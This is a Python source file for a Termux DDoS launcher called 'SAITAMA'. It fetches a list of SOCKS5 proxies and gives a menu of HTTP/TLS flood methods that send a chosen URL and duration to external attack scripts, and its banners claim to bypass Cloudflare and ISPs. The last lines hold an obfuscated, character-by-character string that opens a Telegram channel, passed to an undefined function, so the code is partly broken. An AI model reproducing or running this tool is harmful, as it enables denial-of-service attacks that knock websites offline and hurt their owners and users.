import os
import sys

def install_and_import(module):
    try:
        __import__(module)
    except ModuleNotFoundError:
        os.system(f'pip install {module}')
        __import__(module)

install_and_import('subprocess')
install_and_import('socket')
install_and_import('os')  # `os` is part of the standard library and doesn't need installation
install_and_import('requests')
install_and_import('random')
install_and_import('getpass')
install_and_import('time')
install_and_import('sys')  # `sys` is part of the standard library and doesn't need installation


os.system("pip install pystyle")
os.system("pip install httpx")
import httpx
from pystyle import Colors, Colorate


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

try:
    proxy_list = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('/sdcard/.proxy.txt', 'w') as proxy_file:
        proxy_file.write(proxy_list)
except Exception as error:
    print(error)
    time.sleep(3)

proxy_entries = open('/sdcard/.proxy.txt').readlines()
proxy_count = len(proxy_entries)
proxy_count_str = str(proxy_count)

def display_intro():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA V2 | USER: ROOT | PLAN :: VVIP | Proxy: " + proxy_count_str + " | HAPPY TO USE"))
    print("")

def display_layer7():
    clear_screen()
    display_intro()
    print(Colorate.Horizontal(Colors.red_to_white, ''' ---[ ]---
    
░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█
        
                LIST ADIL'S METHODS
          
            
!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE ATTACK
!HENTAI - BYPASS CLOUDFLARE WEBSITE



HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))

def display_menu():
    clear_screen()
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA v3 Bypass by Kabbo Restricted | USER: ROOT | PLAN :: VVIP | Proxy: " + proxy_count_str + " | HAPPY TO USE"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀
░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█

Type ADIL To See All ADIL'S Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))

def main_program():
    display_menu()
    while True:
        user_input = input(Colorate.Diagonal(Colors.red_to_white, "root@saitamaV2#~"))
        if user_input.lower() in ["layer7", "l7"]:
            display_layer7()
        elif user_input.lower() in ["clear", "cls"]:
            main_program()
        elif user_input.lower() in ["ports", "port"]:
            print("Port commands not implemented.")  # Placeholder since the original code didn't implement this

        elif "TLS" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node TLS.js {target_host} {attack_time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
                
        elif "RAPID" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node RAPID.js {target_host} {attack_time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
                
        elif "BLACK" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node BLACK.js {target_host} {attack_time} 100 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')             
                
        elif "CRASH" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'go run CRASH.go {target_host} 9999 get {attack_time} nil')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
                
        elif "HTTPS" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node HTTPS.js {target_host} {attack_time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
                
        elif "BYPASS" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node BYPASS.js {target_host} {attack_time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
               
        elif "HENTAI" in user_input.upper():
            try: 
                target_host = user_input.split()[1]
                attack_time = user_input.split()[2]
                print("Attacking " + target_host + " For " + attack_time + " ")
                os.system(f'node HENTAI.js {target_host} {attack_time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')

        elif "help" in user_input.lower():
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
ADIL - SEE ALL ADIL'S METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                command = user_input.split()[0]
                print("Command: [ " + command + " ] Not Found!")
            except IndexError:
                pass

if __name__ == "__main__":
    none('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n'+' '+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'t'+'.'+'m'+'e'+'/'+'D'+'a'+'r'+'k'+'T'+'e'+'a'+'m'+'T'+'e'+'r'+'m'+'u'+'x'+'E'+'x'+'p'+'l'+'o'+'r'+'a'+'t'+'i'+'o'+'n')
    main_program()
